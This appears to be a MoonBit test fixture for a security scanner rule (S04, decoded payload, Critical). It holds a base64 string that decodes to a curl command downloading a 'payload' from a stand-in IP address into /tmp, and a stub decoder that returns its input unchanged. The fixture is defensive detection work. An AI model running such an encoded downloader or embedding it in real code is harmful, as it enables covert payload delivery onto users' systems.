///|
/// 混淆载荷夹具：解码后含下载器 URL（S04 decoded payload → Critical）
fn payload() -> String {
  from_base64("Y3VybCBodHRwOi8vMTMuMzcuMTMuMzcvZHJvcC9wYXlsb2FkLWFyZW5hIC0tb3V0cHV0IC90bXAvcA==")
}

///|
fn from_base64(s : String) -> String {
  s
}
